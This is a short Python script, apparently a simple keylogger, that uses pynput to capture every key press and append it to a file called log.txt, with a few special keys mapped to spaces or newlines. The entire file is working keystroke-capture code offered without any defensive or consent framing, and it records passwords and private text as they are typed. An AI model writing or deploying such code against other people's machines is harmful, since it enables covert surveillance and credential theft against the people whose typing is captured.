#storing the keystroke in a text file- log.txt

from pynput.keyboard import Listener


def write_to_file(key):             #with keyword- releases memory/ resources automatically and f.close() is not needed
  letter=str(key)
  letter=letter.replace("'","")
  
  if letter=='Key.shift_r':
    letter=''
  
  if letter=='Key.space':
    letter=' '
  
  if letter=='Key.ctrl_l':
    letter=''
  
  if letter=='Key.enter':
    letter='\n'
  
	
  with open("log.txt",'a') as f:
    f.write(letter)

  
#listening to keystrokes
with Listener(on_press=write_to_file) as l:
  l.join()